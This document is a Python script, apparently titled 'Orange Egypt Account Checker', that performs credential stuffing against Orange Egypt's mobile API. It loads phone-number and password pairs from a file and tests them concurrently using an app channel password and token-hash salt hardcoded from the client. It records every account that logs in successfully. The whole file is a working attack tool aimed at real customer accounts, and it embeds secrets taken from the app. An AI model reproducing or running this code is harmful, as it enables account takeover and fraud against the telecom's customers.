import requests
import json
import hashlib
from colorama import Fore, Style, Back, init
import pandas as pd
import concurrent.futures
import time
from datetime import datetime
import os
import sys
import threading

# إعداد مكتبة colorama لتنسيق الألوان في المخرجات
init(autoreset=True)

# المتغيرات العامة
MAX_WORKERS = 50  # عدد العمال المتزامنين
CHUNK_SIZE = 20   # حجم البيانات المجمعة
TIMEOUT = 5       # وقت الانتظار للطلبات
REQUEST_DELAY = 0.1  # تأخير بين الطلبات

# دالة لطباعة الشعار
# تعرض شعار البرنامج ومعلومات المؤلف

def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.WHITE + Style.BRIGHT}Orange Egypt Account Checker - Premium Version{Fore.CYAN}   ║
{Fore.CYAN}║ {Fore.WHITE + Style.BRIGHT}Author: Omar Tnzxo{Fore.CYAN}                               ║
{Fore.CYAN}║ {Fore.WHITE + Style.BRIGHT}GitHub: https://github.com/Omar-Tnzxo{Fore.CYAN}            ║
{Fore.CYAN}╚══════════════════════════════════════════════════╝
"""
    print(banner)

# دالة لطباعة الحالة
# تعرض رسائل الحالة مع توقيت

def print_status(message, status_type="INFO"):
    colors = {
        "INFO": Fore.CYAN,
        "SUCCESS": Fore.GREEN,
        "ERROR": Fore.RED,
        "WARNING": Fore.YELLOW
    }
    timestamp = datetime.now().strftime('%H:%M:%S')
    color = colors.get(status_type, Fore.WHITE)
    print(f"{color}[{timestamp}] [{status_type}] {message}")

# دالة لتحميل البيانات من ملف الحسابات
# تقرأ الحسابات من ملف نصي وتعيد قائمة بها

def read_accounts(filename):
    try:
        print_status("Reading accounts file...", "INFO")
        with open(filename, 'r', encoding='utf-8') as file:
            accounts = []
            for line in file:
                line = line.strip()
                if ':' in line:
                    number, password = line.split(':')
                    accounts.append((number.strip(), password.strip()))
        print_status(f"Successfully loaded {len(accounts)} accounts", "INFO")
        return accounts
    except Exception as e:
        print_status(f"Failed to read accounts file: {str(e)}", "ERROR")
        return []

# دالة لتسجيل الدخول باستخدام بيانات الحساب
# تحاول تسجيل الدخول باستخدام الرقم وكلمة المرور

def login_account(account_data):
    number, password = account_data
    session = None
    try:
        token, htv, session = get_token()
        if not token or not htv or not session:
            return False, number, password, "Failed to generate token"

        url = "https://services.orange.eg/APIs/Gaming/api/WheelOfFortune/Spin"
        payload = json.dumps({
            "ChannelName": "MobinilAndMe",
            "ChannelPassword": "ig3yh*mk5l42@oj7QAR8yF",
            "Dial": number,
            "Language": "en",
            "Password": password,
            "ServiceClassId": "1033"
        })

        headers = {
            'User-Agent': "okhttp/3.14.9",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'IsAndroid': "true",
            'OsVersion': "9",
            'AppVersion': "7.2.0",
            '_ctv': token,
            '_htv': htv,
            'isEasyLogin': "false",
            'Content-Type': "application/json; charset=UTF-8"
        }

        time.sleep(REQUEST_DELAY)  # تأخير بسيط لتجنب التقييد
        response = session.post(url, data=payload, headers=headers, timeout=TIMEOUT)
        if response.status_code == 200:
            try:
                offer_name = response.json()["OfferDetails"]["OfferName"]
                with print_lock:
                    print(f"{Fore.GREEN}{'═' * 60}")
                    print_status(f"Account: {number}", "SUCCESS")
                    print_status(f"Password: {password}", "SUCCESS")
                    print(f"{Fore.GREEN}{'═' * 60}\n")
                return True, number, password, offer_name
            except KeyError:
                error_msg = response.json().get("ErrorDescription", "Unknown error")
                with print_lock:
                    print(f"{Fore.RED}{'═' * 60}")
                    print_status(f"Invalid Account: {number}", "ERROR")
                    print(f"{Fore.RED}{'═' * 60}\n")
                return False, number, password, error_msg
        else:
            return False, number, password, f"HTTP Error: {response.status_code}"
    except Exception as e:
        return False, number, password, str(e)
    finally:
        if session:
            session.close()

# دالة لحفظ النتائج في ملف CSV
# تحفظ الحسابات الناجحة والفاشلة في ملف

def save_results(successful_accounts, failed_accounts, elapsed_time):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    successful_csv = f'orange_working_{timestamp}.csv'
    print_status("Saving working accounts to CSV file...", "INFO")
    pd.DataFrame(successful_accounts).to_csv(successful_csv, index=False)
    print_status(f"Working accounts saved to '{successful_csv}'", "INFO")
    print("\n" + "═" * 60)
    print(f"{Style.BRIGHT}{Back.BLACK}{Fore.WHITE}                     FINAL RESULTS                     {Style.RESET_ALL}")
    print("═" * 60)
    print(f"{Fore.GREEN}✓ Working Accounts: {len(successful_accounts)}")
    print(f"{Fore.RED}✗ Invalid Accounts: {len(failed_accounts)}")
    print(f"{Fore.CYAN}⌛ Time Elapsed: {elapsed_time:.2f} seconds")
    print("═" * 60)
    print(f"\n{Fore.YELLOW}Program will close automatically in 3 seconds...{Style.RESET_ALL}")
    time.sleep(3)
    sys.exit(0)

# دالة لتحميل الرمز المميز
# تحاول تحميل الرمز المميز من الخادم

def get_token():
    url = "https://services.orange.eg/GetToken.svc/GenerateToken"
    headers = {
        "Content-Type": "application/json; charset=UTF-8",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/3.14.9",
    }
    data = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
    
    try:
        session = requests.Session()
        response = session.post(url, headers=headers, data=data, timeout=TIMEOUT)
        if response.status_code == 200:
            token = response.json()["GenerateTokenResult"]["Token"]
            hash_input = token + ",{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk"
            htv = hashlib.sha256(hash_input.encode()).hexdigest().upper()
            return token, htv, session
        return None, None, None
    except:
        return None, None, None

# الدالة الرئيسية
# تدير تدفق البرنامج وتبدأ عملية التحقق

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    print_banner()
    accounts = read_accounts('orange.txt')
    if not accounts:
        print_status("No accounts found or failed to read file.", "ERROR")
        time.sleep(3)
        sys.exit(1)

    print_status("Starting check process...", "INFO")
    print("═" * 60 + "\n")

    successful_accounts = []
    failed_accounts = []
    start_time = time.time()

    global print_lock
    print_lock = threading.Lock()
    
    def check_account_with_lock(account):
        success, number, password, message = login_account(account)
        with print_lock:
            if success:
                successful_accounts.append({'Phone': number, 'Password': password, 'Result': message})
            else:
                failed_accounts.append({'Phone': number, 'Password': password, 'Failure Reason': message})
        return success, number, password, message

    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for i in range(0, len(accounts), CHUNK_SIZE):
            chunk = accounts[i:i + CHUNK_SIZE]
            chunk_futures = [executor.submit(check_account_with_lock, account) for account in chunk]
            futures.extend(chunk_futures)
            # انتظار اكتمال المجموعة الحالية قبل بدء المجموعة التالية
            concurrent.futures.wait(chunk_futures, timeout=None)

    elapsed_time = time.time() - start_time
    save_results(successful_accounts, failed_accounts, elapsed_time)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_status("\nProcess interrupted by user.", "WARNING")
        time.sleep(2)
        sys.exit(0)
    except Exception as e:
        print_status(f"An unexpected error occurred: {str(e)}", "ERROR")
        time.sleep(2)
        sys.exit(1)